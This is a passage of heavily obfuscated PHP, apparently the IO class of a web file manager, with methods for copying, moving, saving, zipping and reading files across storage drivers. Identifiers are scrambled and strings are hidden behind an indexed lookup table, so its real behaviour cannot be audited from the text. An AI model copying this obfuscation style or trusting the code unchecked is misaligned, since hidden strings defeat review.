self::driverMake($àìİ©Ö¨[0]); if (!$Áüè²”) { return !1; } if (method_exists($Áüè²”, $¿úˆ¥¬ˆ)) { $šàÀ×‰¡ = @call_user_func_array(array($Áüè²”, $¿úˆ¥¬ˆ), $àìİ©Ö¨); } else { if (method_exists($Áüè²”, $µ‰’š”Ó[1226])) { $šàÀ×‰¡ = @call_user_func_array(array($Áüè²”, $¿úˆ¥¬ˆ), $àìİ©Ö¨); } else { if (method_exists(self, $¿úˆ¥¬ˆ)) { $šàÀ×‰¡ = @call_user_func_array(array(self, $¿úˆ¥¬ˆ), $àìİ©Ö¨); } else { $šàÀ×‰¡ = call_user_func_array(array(parent, $¿úˆ¥¬ˆ), $àìİ©Ö¨); } } } Hook::trigger($µ‰’š”Ó[1224] . $¿úˆ¥¬ˆ . $µ‰’š”Ó[1227], $ì¼Ç§À, $šàÀ×‰¡); return $šàÀ×‰¡; } public static function init($æÔÒÛ˜ñ) { return self::driverMake($æÔÒÛ˜ñ); } public static function copy($½àÍƒò¯, $¥şÖ¿•, $‚·Îˆ™‰ = false, $µõŞ„ö = false) { return self::copyMoveStart($½àÍƒò¯, $¥şÖ¿•, $‚·Îˆ™‰, $_SERVER[Ò°Ì”İ•][633], $µõŞ„ö); } public static function move($­ÈÒ‰Ñİ, $àá†½¹, $¯ø™ª = false, $Ü‚å¿Ã‹ = false) { return self::copyMoveStart($­ÈÒ‰Ñİ, $àá†½¹, $¯ø™ª, $_SERVER[Ò°Ì”İ•][635], $Ü‚å¿Ã‹); } public static function copyMoveChildren($¼ïÂİÓº, $áôğä˜û, $ßØÚªåÖ = "\143\157\160\171", $²Äı÷Ûï = REPEAT_REPLACE) { $ëô÷ĞÙˆ =& $_SERVER[Ò°Ì”İ•]; $­şÃ˜”Ï = $¼ïÂİÓº; $ù¥‘¤ÒÊ = self::driverMake($¼ïÂİÓº); $ÈÜê–öí = $ù¥‘¤ÒÊ->listPath($¼ïÂİÓº, !0); $£¯åÂ‚û = array_merge($ÈÜê–öí[$ëô÷ĞÙˆ[97]], $ÈÜê–öí[$ëô÷ĞÙˆ[96]]); foreach ($£¯åÂ‚û as $ËİÑåôÎ) { self::copyMoveStart($ËİÑåôÎ[$ëô÷ĞÙˆ[98]], $áôğä˜û, $²Äı÷Ûï, $ßØÚªåÖ, !1); } if ($ßØÚªåÖ == $ëô÷ĞÙˆ[635]) { self::remove($­şÃ˜”Ï); } } private static function copyMoveStart($ÓØ—ö›â, $ƒ‚®©Ÿí, $¼ßÌ•İÁ, $÷ÍÖñåß, $„Á·õ) { $ş½”ÜƒÔ =& $_SERVER[Ò°Ì”İ•]; $×Ãê´Û = array($ÓØ—ö›â, $ƒ‚®©Ÿí, $¼ßÌ•İÁ, $„Á·õ); Hook::trigger($ş½”ÜƒÔ[1224] . $÷ÍÖñåß . $ş½”ÜƒÔ[1225], $×Ãê´Û); $æ—ßâØ† = self::copyMove($ÓØ—ö›â, $ƒ‚®©Ÿí, $¼ßÌ•İÁ, $÷ÍÖñåß, $„Á·õ); Hook::trigger($ş½”ÜƒÔ[1224] . $÷ÍÖñåß . $ş½”ÜƒÔ[1227], $×Ãê´Û, $æ—ßâØ†); return $æ—ßâØ†; } public static function saveFile($Òœ“ä–, $¤öÆÆŠ, $Ú£«™± = true) { $…Àää¢ =& $_SERVER[Ò°Ì”İ•]; $õ¥Êä‹Æ = self::info($¤öÆÆŠ); $çÜ·ŞÑØ = self::driverMake($Òœ“ä–); $çƒ¼×ú = self::driverMake($¤öÆÆŠ); $¢ÙŞıĞ = !1; if ($çƒ¼×ú->pathParse[$…Àää¢[1228]]) { $¢ÙŞıĞ = $çƒ¼×ú; $±î—¸ÌØ = $çƒ¼×ú->pathParse[$…Àää¢[1228]]; $çƒ¼×ú = self::driverMake($±î—¸ÌØ); } if ($çÜ·ŞÑØ->pathParse[$…Àää¢[1228]]) { $¼ õøòè = $çÜ·ŞÑØ->pathParse[$…Àää¢[1228]]; $çÜ·ŞÑØ = self::driverMake($¼ õøòè); } $­¥´ËàÀ = $çƒ¼×ú->pathFather($¤öÆÆŠ); $íİ°ø = !0; if (!$Ú£«™± && self::driverIsSame($çÜ·ŞÑØ, $çƒ¼×ú)) { $íİ°ø = !1; } $¯øºˆñÖ = self::copyFile($çÜ·ŞÑØ, $Òœ“ä–, $çƒ¼×ú, $­¥´ËàÀ, $õ¥Êä‹Æ[$…Àää¢[32]], $íİ°ø); if ($¢ÙŞıĞ) { $¯øºˆñÖ = $¢ÙŞıĞ->getPathOuter($¯øºˆñÖ); } return $¯øºˆñÖ; } private static function copyMove($š†Ã€İº, $Ş¾½°€õ, $Ö®˜Ü„Ú, $·´±û, $Ï¢°Á¾­ = false) { $ã³åøâ¦ =& $_SERVER[Ò°Ì”İ•]; if (!$š†Ã€İº || $š†Ã€İº == $ã³åøâ¦[8] || !$Ş¾½°€õ) { return !1; } ignore_timeout(); $ÄÚÖ±Ï = self::driverMake($š†Ã€İº); $ï„ÌÂ = self::driverMake($Ş¾½°€õ); $ú¶÷³¥ = $·´±û == $ã³åøâ¦[635]; $‹’è³… = !1; if ($ï„ÌÂ->pathParse[$ã³åøâ¦[1228]]) { $‹’è³… = $ï„ÌÂ; $Ş¾½°€õ = $ï„ÌÂ->pathParse[$ã³åøâ¦[1228]]; $ï„ÌÂ = self::driverMake($Ş¾½°€õ); } if ($ÄÚÖ±Ï->pathParse[$ã³åøâ¦[1228]]) { $š†Ã€İº = $ÄÚÖ±Ï->pathParse[$ã³åøâ¦[1228]]; $ÄÚÖ±Ï = self::driverMake($š†Ã€İº); } self::check($ÄÚÖ±Ï, $š†Ã€İº, $ï„ÌÂ, $Ş¾½°€õ); Hook::trigger($ã³åøâ¦[1229], $ÄÚÖ±Ï, $š†Ã€İº, $ï„ÌÂ, $Ş¾½°€õ); $Ò‡§¢î = self::driverIsSame($ÄÚÖ±Ï, $ï„ÌÂ); if ($Ò‡§¢î) { if ($·´±û == $ã³åøâ¦[635] && !method_exists($ï„ÌÂ, $ã³åøâ¦[1230]) && trim($Ş¾½°€õ, $ã³åøâ¦[8]) == trim($ï„ÌÂ->pathFather($š†Ã€İº), $ã³åøâ¦[8])) { if ($ÄÚÖ±Ï->pathThis($š†Ã€İº) != $Ï¢°Á¾­ && !$ÄÚÖ±Ï->isOsDriver()) { return $ÄÚÖ±Ï->rename($š†Ã€İº, $Ï¢°Á¾­); } return $ï„ÌÂ->getPathOuter($š†Ã€İº); } if (method_exists($ï„ÌÂ, $·´±û)) { return $ï„ÌÂ->{$·´±û}($š†Ã€İº, $Ş¾½°€õ, $Ö®˜Ü„Ú, $Ï¢°Á¾­); } } if ($Ò‡§¢î && $·´±û == $ã³åøâ¦[635] && $ï„ÌÂ->getType() == $ã³åøâ¦[120]) { $…İú‰şÅ = $ï„ÌÂ->movePath($š†Ã€İº, $Ş¾½°€õ, $Ï¢°Á¾­); if ($…İú‰şÅ) { return $…İú‰şÅ; } } $‘†€¬Û = $ÄÚÖ±Ï->isFile($š†Ã€İº); if (!$‘†€¬Û && $ï„ÌÂ->getType() == $ã³åøâ¦[830] && $ÄÚÖ±Ï->getType() == $ã³åøâ¦[120]) { $…İú‰şÅ = $ï„ÌÂ->copyFolderFromIO($ÄÚÖ±Ï, $š†Ã€İº, $Ş¾½°€õ, $Ö®˜Ü„Ú, $ú¶÷³¥, $Ï¢°Á¾­); } else { $…İú‰şÅ = self::copyPath($ÄÚÖ±Ï, $š†Ã€İº, $ï„ÌÂ, $Ş¾½°€õ, $Ö®˜Ü„Ú, $ú¶÷³¥, $‘†€¬Û, $Ï¢°Á¾­); } if ($…İú‰şÅ && $ú¶÷³¥) { $ÄÚÖ±Ï->remove($š†Ã€İº); } if ($‹’è³…) { $…İú‰şÅ = $‹’è³…->getPathOuter($…İú‰şÅ); } return $…İú‰şÅ; } private static function check($š«¬±šÙ, $ÚËıåäî, $ÕãûÒ¹ƒ, &$•¾Õå») { $«ùÈÇØì =& $_SERVER[Ò°Ì”İ•]; if (self::driverIsSame($š«¬±šÙ, $ÕãûÒ¹ƒ) && $š«¬±šÙ->isFolder($ÚËıåäî) && $š«¬±šÙ->isParentOf($ÚËıåäî, $•¾Õå»)) { show_json(LNG($«ùÈÇØì[1231]), !1); } if (!$š«¬±šÙ->exist($ÚËıåäî)) { show_json(LNG($«ùÈÇØì[119]), !1); } } private static function copyPath($ñİ¾—‘«, $’Ä’åïØ, $®¬ÜËê¥, $Ü°‹ëú, $¶À‹«Üù, $êƒÜÁÔœ, $ÎĞ´Â£µ, $©†ôš—á = false, $èú¦Ô¾ = true) { $Ô©ÚÕÄÒ =& $_SERVER[Ò°Ì”İ•]; $Ş¨÷‘ì– = empty($©†ôš—á) && $©†ôš—á !== $Ô©ÚÕÄÒ[241] ? $ñİ¾—‘«->pathThis($’Ä’åïØ) : $©†ôš—á; if ($¶À‹«Üù) { $Ä«»£” = $®¬ÜËê¥->fileNameExist($Ü°‹ëú, $Ş¨÷‘ì–); $ÚŸéò÷Û = $Ş¨÷‘ì–; $Ş¨÷‘ì– = $®¬ÜËê¥->fileNameAuto($Ü°‹ëú, $Ş¨÷‘ì–, $¶À‹«Üù, !$ÎĞ´Â£µ); if (!$Ä«»£” || $ÚŸéò÷Û != $Ş¨÷‘ì–) { $¶À‹«Üù = !1; } if ($èú¦Ô¾ && !$¶À‹«Üù) { $®¬ÜËê¥->_data[$Ô©ÚÕÄÒ[1232]] = !0; } } if ($ÎĞ´Â£µ) { return self::copyFile($ñİ¾—‘«, $’Ä’åïØ, $®¬ÜËê¥, $Ü°‹ëú, $Ş¨÷‘ì–, $êƒÜÁÔœ); } if ($¶À‹«Üù == REPEAT_RENAME_FOLDER) { $¶À‹«Üù = !1; } $Æ‘ÛÈñ“ = rtrim($Ü°‹ëú, $Ô©ÚÕÄÒ[8]) . $Ô©ÚÕÄÒ[8] . $Ş¨÷‘ì–; $é¼¥Ûò = $®¬ÜËê¥->mkdir($®¬ÜËê¥->getPath($Æ‘ÛÈñ“), $¶À‹«Üù); $Ü°‹ëú = $®¬ÜËê¥->getPathInner($é¼¥Ûò); $ş£òª¦Ø = $ñİ¾—‘«->listPath($’Ä’åïØ, !0); $ş£òª¦Ø = is_array($ş£òª¦Ø) ? $ş£òª¦Ø : array($Ô©ÚÕÄÒ[97] => array(), $Ô©ÚÕÄÒ[96] => array()); $ôî÷°Â = array_merge($ş£òª¦Ø[$Ô©ÚÕÄÒ[97]], $ş£òª¦Ø[$Ô©ÚÕÄÒ[96]]); foreach ($ôî÷°Â as $Ş¼ˆÆ¸Ò) { $‰Ì›ƒ¯… = $Ş¼ˆÆ¸Ò[$Ô©ÚÕÄÒ[33]] == $Ô©ÚÕÄÒ[243]; $’Ä’åïØ = $ñİ¾—‘«->getPathInner($Ş¼ˆÆ¸Ò[$Ô©ÚÕÄÒ[98]]); $åÍÙæùä = self::copyPath($ñİ¾—‘«, $’Ä’åïØ, $®¬ÜËê¥, $Ü°‹ëú, $¶À‹«Üù, $êƒÜÁÔœ, $‰Ì›ƒ¯…, !1, !1); if (!$åÍÙæùä) { IO::errorTips($Ô©ÚÕÄÒ[1233] . $’Ä’åïØ . $Ô©ÚÕÄÒ[84] . $Ü°‹ëú); } } self::copyMoveKeepInfo($ñİ¾—‘«, $’Ä’åïØ, $é¼¥Ûò); return $é¼¥Ûò; } private static function copyFile($Şì£ÏÉè, $ûœˆÏ–è, $Á¯ó×É, $½…±úÎ‰, $®¸ò¯ù, $¿µÃªŞ) { $‚Ì¶Ì˜© =& $_SERVER[Ò°Ì”İ•]; $½…±úÎ‰ = $Á¯ó×É->getPath(rtrim($½…±úÎ‰, $‚Ì¶Ì˜©[8]) . $‚Ì¶Ì˜©[8] . $®¸ò¯ù); $´ê¶Ø¿¡ = $‚Ì¶Ì˜©[1234] . time() . rand_string(5); Hook::trigger($‚Ì¶Ì˜©[1235], $Şì£ÏÉè, $ûœˆÏ–è, $Á¯ó×É, $½…±úÎ‰, $®¸ò¯ù, $´ê¶Ø¿¡); if (self::driverIsSame($Şì£ÏÉè, $Á¯ó×É)) { if ($¿µÃªŞ) { $¼¬û‰‚õ = $Á¯ó×É->moveFile($ûœˆÏ–è, $½…±úÎ‰); } else { $¼¬û‰‚õ = $Á¯ó×É->copyFile($ûœˆÏ–è, $½…±úÎ‰); } Hook::trigger($‚Ì¶Ì˜©[1236], $Şì£ÏÉè, $ûœˆÏ–è, $Á¯ó×É, $½…±úÎ‰, $®¸ò¯ù, $¼¬û‰‚õ); self::copyMoveKeepInfo($Şì£ÏÉè, $ûœˆÏ–è, $¼¬û‰‚õ); return $¼¬û‰‚õ; } $ªğñ½Ù¢ = TEMP_FILES; if ($GLOBALS[$‚Ì¶Ì˜©[6]][$‚Ì¶Ì˜©[103]][$‚Ì¶Ì˜©[870]]) { $ªğñ½Ù¢ = $GLOBALS[$‚Ì¶Ì˜©[6]][$‚Ì¶Ì˜©[103]][$‚Ì¶Ì˜©[870]]; } $ñŠîƒ±¶ = $ªğñ½Ù¢; mk_dir($ñŠîƒ±¶); $äœŞßÉŠ = $ñŠîƒ±¶ . $´ê¶Ø¿¡; $ÂÄñÒÙğ = $äœŞßÉŠ; $äœŞßÉŠ = $Şì£ÏÉè->download($ûœˆÏ–è, $äœŞßÉŠ); $äœŞßÉŠ = $Şì£ÏÉè->iconvApp($äœŞßÉŠ); if (substr($äœŞßÉŠ, strlen($ªğñ½Ù¢)) == $ªğñ½Ù¢) { $¿µÃªŞ = !0; } $¼¬û‰‚õ = $Á¯ó×É->upload($½…±úÎ‰, $äœŞßÉŠ, $¿µÃªŞ); self::remove($ÂÄñÒÙğ); Hook::trigger($‚Ì¶Ì˜©[1236], $Şì£ÏÉè, $ûœˆÏ–è, $Á¯ó×É, $½…±úÎ‰, $®¸ò¯ù, $¼¬û‰‚õ); self::copyMoveKeepInfo($Şì£ÏÉè, $ûœˆÏ–è, $¼¬û‰‚õ); return $¼¬û‰‚õ; } private static function copyMoveKeepInfo($ÑÜšùô, $Â¨¡”í¥, $²ó„±ÏÔ) { if (!$²ó„±ÏÔ) { return; } $“Ÿ„”»™ = $ÑÜšùô->info($Â¨¡”í¥); if (!is_array($“Ÿ„”»™)) { return; } IO::setModifyTime($²ó„±ÏÔ, $“Ÿ„”»™[$_SERVER[Ò°Ì”İ•][99]]); } public static function pathFather($İ•¤şÀ) { $³‰çæÏÚ = IO::init($İ•¤şÀ); $éÇ­‰Ëà = $³‰çæÏÚ->pathFather($³‰çæÏÚ->path); return $³‰çæÏÚ->getPathOuter($éÇ­‰Ëà); } public static function fileOut($¿¡ñğ­, $¼¼Àæşˆ = false, $¦¹”Å„ = false, $°ÌÃµ¡ = '') { $Ôô¾Òß¼ = self::driverMake($¿¡ñğ­); if ($Ôô¾Òß¼->isFileOutServer()) { return $Ôô¾Òß¼->fileOutServer($¿¡ñğ­, $¼¼Àæşˆ, $¦¹”Å„, $°ÌÃµ¡); } return $Ôô¾Òß¼->fileOut($¿¡ñğ­, $¼¼Àæşˆ, $¦¹”Å„, $°ÌÃµ¡); } public static function fileOutImage($½Ã„öÃ, $ÍÇ«¸È¸ = 250) { $òÜµ™¥ = array(250, 600, 1200, 2000, 3000, 5000); for ($•›ïû¬· = 0; $•›ïû¬· < count($òÜµ™¥); $•›ïû¬·++) { if ($•›ïû¬· == 0 && $ÍÇ«¸È¸ <= $òÜµ™¥[$•›ïû¬·]) { $ÍÇ«¸È¸ = $òÜµ™¥[$•›ïû¬·]; break; } else { if ($ÍÇ«¸È¸ > $òÜµ™¥[$•›ïû¬· - 1] && $ÍÇ«¸È¸ <= $òÜµ™¥[$•›ïû¬·]) { $ÍÇ«¸È¸ = $òÜµ™¥[$•›ïû¬·]; break; } else { if ($•›ïû¬· == count($òÜµ™¥) - 1 && $ÍÇ«¸È¸ > $òÜµ™¥[$•›ïû¬·]) { $ÍÇ«¸È¸ = $òÜµ™¥[$•›ïû¬·]; break; } } } } $ïÓ¸ŞÇÁ = self::driverMake($½Ã„öÃ); if ($ïÓ¸ŞÇÁ->isFileOutServer()) { return $ïÓ¸ŞÇÁ->fileOutImageServer($½Ã„öÃ, $ÍÇ«¸È¸); } return $ïÓ¸ŞÇÁ->fileOutImage($½Ã„öÃ, $ÍÇ«¸È¸); } private static function driverIsSame($ìÅë·, $øóë´) { $îÖü‡ƒ =& $_SERVER[Ò°Ì”İ•]; $ñ€â÷ÁÄ = $ìÅë·->getType(); $ë¿ğ¨ó = $øóë´->getType(); if ($ñ€â÷ÁÄ != $ë¿ğ¨ó) { return !1; } if ($ñ€â÷ÁÄ == $îÖü‡ƒ[830]) { return !0; } if ($ñ€â÷ÁÄ == $îÖü‡ƒ[120]) { return !0; } if ($ìÅë·->pathDriver == $øóë´->pathDriver) { return !0; } return !1; } public static function copyUpdate($ÊèåïêË, $ÂùÉØ“‡) { $ãŸ¨¼×À =& $_SERVER[Ò°Ì”İ•]; if (!IO::exist($ÊèåïêË)) { return !1; } if (!IO::exist($ÂùÉØ“‡)) { IO::mkdir($ÂùÉØ“‡); } $ó¸ò‡ëŸ = array_to_keyvalue(self::listAllSimple($ÊèåïêË), $ãŸ¨¼×À[98]); $Îğİ÷À˜ = array_to_keyvalue(self::listAllSimple($ÂùÉØ“‡), $ãŸ¨¼×À[98]); $’ëøÍ = array(); $³‰àä€± = array(); foreach ($ó¸ò‡ëŸ as $¹â¹¢´« => $³‹ÑÅ÷ş) { if (isset($Îğİ÷À˜[$¹â¹¢´«])) { if ($³‹ÑÅ÷ş[$ãŸ¨¼×À[89]] == 1) { continue; } if ($Îğİ÷À˜[$¹â¹¢´«][$ãŸ¨¼×À[90]] == $³‹ÑÅ÷ş[$ãŸ¨¼×À[90]]) { continue; } } if ($³‹ÑÅ÷ş[$ãŸ¨¼×À[89]] == 1) { $³‰àä€±[] = $ÂùÉØ“‡ . $ãŸ¨¼×À[8] . trim($¹â¹¢´«, $ãŸ¨¼×À[8]); continue; } $›”Ã¡« = strstr(trim($¹â¹¢´«, $ãŸ¨¼×À[8]), $ãŸ¨¼×À[8]) ? get_path_father($¹â¹¢´«) : $ãŸ¨¼×À[12]; $’ëøÍ[] = array($ãŸ¨¼×À[1237] => $³‹ÑÅ÷ş[$ãŸ¨¼×À[100]], $ãŸ¨¼×À[1238] => rtrim($ÂùÉØ“‡, $ãŸ¨¼×À[8]) . $ãŸ¨¼×À[8] . $›”Ã¡«, $ãŸ¨¼×À[1239] => $³‹ÑÅ÷ş); } $ìƒ§÷³· = array($ãŸ¨¼×À[243] => $’ëøÍ, $ãŸ¨¼×À[89] => $³‰àä€±); Hook::trigger($ãŸ¨¼×À[1240], $ÊèåïêË, $ÂùÉØ“‡, $ìƒ§÷³·); foreach ($³‰àä€± as $³‹ÑÅ÷ş) { IO::mkdir($³‹ÑÅ÷ş); } foreach ($’ëøÍ as $³‹ÑÅ÷ş) { IO::copy($³‹ÑÅ÷ş[$ãŸ¨¼×À[1237]], $³‹ÑÅ÷ş[$ãŸ¨¼×À[1238]], REPEAT_REPLACE); } } public static function fileSubstr($óßøÜ•Ù, $éË²óØ›, $Õä¶³™ú = false) { $‰ š‹…Û =& $_SERVER[Ò°Ì”İ•]; $‹ä¬Œîİ = self::driverMake($óßøÜ•Ù); $“ßÌ¹š = $‹ä¬Œîİ->size($óßøÜ•Ù); $ôïßÏÅ¿ = $éË²óØ›; $¢Í”ô» = $Õä¶³™ú; if ($éË²óØ› < 0) { $éË²óØ› = $“ßÌ¹š + $éË²óØ›; } if ($Õä¶³™ú === !1) { $Õä¶³™ú = $“ßÌ¹š - $éË²óØ›; } if ($éË²óØ› + $Õä¶³™ú > $“ßÌ¹š) { $Õä¶³™ú = $“ßÌ¹š - $éË²óØ›; } if (!$“ßÌ¹š && $‹ä¬Œîİ->getType() == $‰ š‹…Û[120] && !$‹ä¬Œîİ->exist($óßøÜ•Ù)) { $˜ÛÙùÜ = get_path_this($óßøÜ•Ù); $ñ¥üÖŒ = parse_url_query($˜ÛÙùÜ); if (is_array($ñ¥üÖŒ) && isset($ñ¥üÖŒ[$‰ š‹…Û[32]])) { $˜ÛÙùÜ = urldecode($ñ¥üÖŒ[$‰ š‹…Û[32]]); } throw new Exception($‰ š‹…Û[1241] . LNG($‰ š‹…Û[1242]) . $‰ š‹…Û[1039] . clear_html($˜ÛÙùÜ) . $‰ š‹…Û[12]); } if ($Õä¶³™ú <= 0) { return $‰ š‹…Û[12]; } if ($éË²óØ› < 0 || $éË²óØ› >= $“ßÌ¹š || $Õä¶³™ú > 1024 * 1024 * 10) { throw new Exception("\x66\x69\154\x65\122\145\141\144\40\145\x72\x72\x6f\162\x21\40\x73\x74\x61\162\164\75{$éË²óØ›}\73\154\x65\x6e\147\x74\150\x3d{$Õä¶³™ú}\73\x20\x73\151\172\145\75{$“ßÌ¹š}\x3b"); } $ë¦­‡ = $‹ä¬Œîİ->fileSubstr($óßøÜ•Ù, $éË²óØ›, $Õä¶³™ú); if (!$ë¦­‡ && $Õä¶³™ú && isset($GLOBALS[$‰ š‹…Û[1243]])) { throw new Exception($GLOBALS[$‰ š‹…Û[1243]][$‰ š‹…Û[1244]]); } return $ë¦­‡; } private static function driverMake(&$—´ü½ç) { $Ê’¾õ =& $_SERVER[Ò°Ì”İ•]; $šæÙÒ®à = KodIO::parse($—´ü½ç); if (!self::$driverListSystem) { $ßó×Æ§À = Model($Ê’¾õ[840])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($ßó×Æ§À, $Ê’¾õ[487]); } if ($šæÙÒ®à[$Ê’¾õ[33]] == KodIO::KOD_IO && !self::$driverListSystem[$šæÙÒ®à[$Ê’¾õ[487]]]) { throw new Exception($Ê’¾õ[1245]); return !1; } $—´ü½ç = $šæÙÒ®à[$Ê’¾õ[1246]]; $‡›Àè³£ = self::driverGet($šæÙÒ®à, $—´ü½ç); return $‡›Àè³£; } private static function driverGet($ÇñÒĞŒğ, &$ˆ›˜Ø·š) { $·×şòà =& $_SERVER[Ò°Ì”İ•]; $÷£¬ìı¾ = $ÇñÒĞŒğ[$·×şòà[1247]]; $¬’ï×Ã‘ = $ÇñÒĞŒğ[$·×şòà[487]]; switch ($ÇñÒĞŒğ[$·×şòà[33]]) { case KodIO::KOD_IO: $³¢û®¬ = self::$driverListSystem[$¬’ï×Ã‘]; break; case KodIO::KOD_SOURCE: $ˆ›˜Ø·š = $¬’ï×Ã‘ . $ˆ›˜Ø·š; $³¢û®¬ = array($·×şòà[1248] => $·×şòà[1249], $·×şòà[6] => $ÇñÒĞŒğ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $î×æ¸Î¬ = $GLOBALS[$·×şòà[1250]]; self::$driverListUser = array_to_keyvalue($î×æ¸Î¬, $·×şòà[487]); } $³¢û®¬ = self::$driverListUser[$¬’ï×Ã‘]; break; case KodIO::KOD_SHARE_LINK: $³¢û®¬ = array($·×şòà[1248] => $·×şòà[1251], $·×şòà[6] => $ÇñÒĞŒğ); $óÏõ‚í = Action($·×şòà[1252])->sharePathInfo($ÇñÒĞŒğ[$·×şòà[98]]); $ˆ›˜Ø·š = $óÏõ‚í[$·×şòà[204]]; if (!$óÏõ‚í[$·×şòà[204]]) { $œ¸ùğ = Model($·×şòà[679])->getInfo($óÏõ‚í[$·×şòà[680]]); $ˆ›˜Ø·š = KodIO::clear($œ¸ùğ[$·×şòà[1253]] . $ÇñÒĞŒğ[$·×şòà[1246]]); $ÇñÒĞŒğ[$·×şòà[572]] = $œ¸ùğ; $ÇñÒĞŒğ[$·×şòà[1228]] = $ˆ›˜Ø·š; $³¢û®¬ = array($·×şòà[1248] => $·×şòà[1254], $·×şòà[6] => $ÇñÒĞŒğ); } break; case KodIO::KOD_SHARE_ITEM: $³¢û®¬ = array($·×şòà[1248] => $·×şòà[1255], $·×şòà[6] => $ÇñÒĞŒğ); $œ¸ùğ = Model($·×şòà[679])->getInfo($ÇñÒĞŒğ[$·×şòà[487]]); if ($œ¸ùğ[$·×şòà[204]] == $·×şòà[241]) { $ˆ›˜Ø·š = KodIO::clear($œ¸ùğ[$·×şòà[1253]] . $ÇñÒĞŒğ[$·×şòà[1246]]); $ÇñÒĞŒğ[$·×şòà[572]] = $œ¸ùğ; $ÇñÒĞŒğ[$·×şòà[1228]] = $ˆ›˜Ø·š; $³¢û®¬ = array($·×şòà[1248] => $·×şòà[1256], $·×şòà[6] => $ÇñÒĞŒğ); } else { if (!$ˆ›˜Ø·š) { $ˆ›˜Ø·š = $œ¸ùğ[$·×şòà[204]]; } } break; default: $ˆ›˜Ø·š = $ÇñÒĞŒğ[$·×şòà[98]]; $³¢û®¬ = array($·×şòà[1248] => $·×şòà[1257]); break; } $ğØ¾°à  = $ÇñÒĞŒğ[$·×şòà[98]]; if (!isset(self::$driverCache[$ğØ¾°à ])) { $ÈæÑ = strtolower($³¢û®¬[$·×şòà[109]]); $ë òÚ  = $GLOBALS[$·×şòà[6]][$·×şòà[103]][$·×şòà[899]]; $˜å±‹àµ = $·×şòà[88] . (isset($ë òÚ [$ÈæÑ]) ? $ë òÚ [$ÈæÑ] : ucfirst($ÈæÑ)); if (!class_exists($˜å±‹àµ)) { show_json("{$˜å±‹àµ}\x20\x6e\x6f\x74\x20\145\170\x69\163\164\163\41", !1); } $Ş›·ÒÌ = isset($³¢û®¬[$·×şòà[6]]) ? $³¢û®¬[$·×şòà[6]] : !1; self::$driverCache[$ğØ¾°à ] = new $˜å±‹àµ($Ş›·ÒÌ); } $á³º‘û = self::$driverCache[$ğØ¾°à ]; $á³º‘û->pathDriver = $÷£¬ìı¾; $á³º‘û->pathBase = $·×şòà[12]; if (isset($³¢û®¬[$·×şòà[6]][$·×şòà[1258]])) { $á³º‘û->pathBase = rtrim($³¢û®¬[$·×şòà[6]][$·×şòà[1258]], $·×şòà[8]) . $·×şòà[8]; $ˆ›˜Ø·š = $á³º‘û->pathBase . ltrim($ˆ›˜Ø·š, $·×şòà[8]); } $ˆ›˜Ø·š = $á³º‘û->getPath($ˆ›˜Ø·š); if (isset($ÇñÒĞŒğ[$·×şòà[1228]])) { $ˆ›˜Ø·š = $ÇñÒĞŒğ[$·×şòà[1228]]; } $á³º‘û->path = $ˆ›˜Ø·š; return $á³º‘û; } public static function errorTips($¾™áš©¾ = false) { $µù‘¹Ã =& $_SERVER[Ò°Ì”İ•]; static $É¾ß§µ³ = array(); $ŒÌ°ª¾ë = 1000; if ($¾™áš©¾ === -1) { return $É¾ß§µ³ ? $É¾ß§µ³[count($É¾ß§µ³) - 1] : $µù‘¹Ã[12]; } if ($¾™áš©¾ === !1) { return implode($µù‘¹Ã[59], $É¾ß§µ³); } if (count($É¾ß§µ³) >= $ŒÌ°ª¾ë) { $É¾ß§µ³ = array_slice($É¾ß§µ³, $ŒÌ°ª¾ë * 0.5, $ŒÌ°ª¾ë); } $É¾ß§µ³[] = $¾™áš©¾; write_log($µù‘¹Ã[187] . ACTION . $µù‘¹Ã[1259] . $¾™áš©¾, $µù‘¹Ã[1260]); } public static function getLastError($˜ïâŒ‘• = '') { $è€ü†¸¡ = self::errorTips(-1); return $è€ü†¸¡ ? $è€ü†¸¡ : $˜ïâŒ‘•; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $±ÌÁŞù¡; if ($±ÌÁŞù¡) { return $±ÌÁŞù¡; } $†ÓÔ¸Ü = IO::init($_SERVER[Ò°Ì”İ•][8]); return $†ÓÔ¸Ü; } private static function iconvSystem($ÈÁ›¬âş) { return self::local()->iconvSystem($ÈÁ›¬âş); } private static function iconvApp($Ï€Ááüº) { return self::local()->iconvApp($Ï€Ááüº); } public static function zipFolder($ğ£Õâ­ˆ, $ÔÆÅİ•ˆ = "\x7a\151\x70", $ßñ—†Á¬ = '', $Œıó¶»´ = REPEAT_RENAME) { $ß¬İ•Öğ =& $_SERVER[Ò°Ì”İ•]; $œÓé¤«» = IO::listPath($ğ£Õâ­ˆ); if (!$œÓé¤«») { return !1; } $œÓé¤«» = array_merge($œÓé¤«»[$ß¬İ•Öğ[96]], $œÓé¤«»[$ß¬İ•Öğ[97]]); return self::zip($œÓé¤«», $ÔÆÅİ•ˆ, $ßñ—†Á¬, $Œıó¶»´); } public static function zip($–™ÚÜ³, $óã–‚Ñİ = "\172\151\160", $©ä¡Õì = '', $­·äåé = REPEAT_RENAME) { $Ä”ÄåÇ² =& $_SERVER[Ò°Ì”İ•]; if (is_string($–™ÚÜ³) && $–™ÚÜ³) { $–™ÚÜ³ = array(array($Ä”ÄåÇ²[98] => $–™ÚÜ³)); } $¦ÇÎÓ´ã = self::init($–™ÚÜ³[0][$Ä”ÄåÇ²[98]]); $¹ö…”È = self::info($–™ÚÜ³[0][$Ä”ÄåÇ²[98]]); $¬ŒÕ¶†œ = $Ä”ÄåÇ²[12]; $íĞû¦†™ = $Ä”ÄåÇ²[12]; $âÚ€Ú‹¾ = $Ä”ÄåÇ²[12]; if ($©ä¡Õì && substr($©ä¡Õì, -1, 1) != $Ä”ÄåÇ²[8]) { $íĞû¦†™ = get_path_father($©ä¡Õì); $âÚ€Ú‹¾ = get_path_this($©ä¡Õì); } else { $íĞû¦†™ = self::pathFather($¹ö…”È[$Ä”ÄåÇ²[98]]); $âÚ€Ú‹¾ = $¹ö…”È[$Ä”ÄåÇ²[32]] . $Ä”ÄåÇ²[10] . $óã–‚Ñİ; if (count($–™ÚÜ³) > 1) { $±ÇÍîš = IO::info($íĞû¦†™); $âÚ€Ú‹¾ = $±ÇÍîš[$Ä”ÄåÇ²[32]] . $Ä”ÄåÇ²[10] . $óã–‚Ñİ; } if ($©ä¡Õì) { $íĞû¦†™ = $©ä¡Õì; } } if ($¦ÇÎÓ´ã->getType() == $Ä”ÄåÇ²[120]) { 